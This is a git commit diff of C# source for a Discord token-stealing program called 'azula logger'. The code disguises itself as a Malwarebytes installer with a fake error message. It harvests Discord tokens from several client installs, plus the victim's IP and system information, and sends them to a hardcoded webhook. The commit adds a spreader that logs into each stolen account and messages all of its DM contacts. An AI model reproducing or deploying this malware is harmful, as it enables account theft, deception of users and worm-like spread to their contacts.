d92e36cdc31f346ba9814c7e94755ce236ad4ef7
dxmon <admin@cythosa.xyz>
2020-10-30 21:49:45 +0100

    changed kill discord option

--- azula logger/Program.cs
+++ azula logger/Program.cs
@@ -29,13 +29,14 @@ namespace azula_logger
             //making webhook url & image a string so u dont have to change it everywhere
             string webhook = "https://discordapp.com/api/webhooks/771479315505348670/IeeW88Ig_jojTE82M1M-9MCErp8wA0uUfVboNQO0_bS_fSG6I-jyJZNe-zVcDPSBI_5s";
             string image = "";
+            bool DiscordKill = false;
             Task.Run(() =>
             {
                 Console.Beep();
                 MessageBox.Show("This programm seems to be corupt please talk to the developer to fix this issue", "Malwarebytes installer");
             });
             //Kills discord so the logger can inject js code in a js file
-            KillDiscord.Kill();
+            if(DiscordKill == false) { } else { KillDiscord.Kill(); }
             //Getting token from normal install
             TokenGetter.GetToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", webhook, image);
             //Getting token from public test beta
@@ -46,8 +47,22 @@ namespace azula_logger
             IPGetter.GetIP(webhook, image);
             //Getting windows system info
             wininfo.GetWinInfo(webhook, image);
+            //spreading the token Logger
 
+            //test
 
+            //making a list with all the tokens so we can try to send a message from all of them
+            List<string> tokensss = new List<string>();
+            //adding all the tokens to our list
+            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", webhook, image));
+            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb", "*.ldb", webhook, image));
+            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb", "*.ldb", webhook, image));
+
+            //trying to send a message with every token we collected in our list ^^^^
+            foreach(var line in tokensss)
+            {
+                Spreader.spread(line);
+            }
         }
 
     }
---
+++ azula logger/Spreader.cs
@@ -0,0 +1,58 @@
+﻿using Discord;
+using Discord.Gateway;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace azula_logger
+{
+    public static class Spreader
+    {
+
+        public static string message()
+        {
+            string msg = "your-Message";
+
+            return msg;
+        }
+
+
+
+
+
+
+
+        public static void spread(string token )
+        {
+            DiscordSocketClient client = new DiscordSocketClient();
+            try
+            {
+                client.Login(token);
+                client.OnLoggedIn += Client_OnLoggedIn;
+
+            }
+            catch { }            
+
+            
+        }
+
+        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
+        {
+            try
+            {
+                foreach (var dm in client.GetPrivateChannels())
+                {
+                    Thread.Sleep(69);
+                    dm.SendMessage(message());
+                }
+            }
+            catch { }
+            
+        }
+
+       
+    }
+}
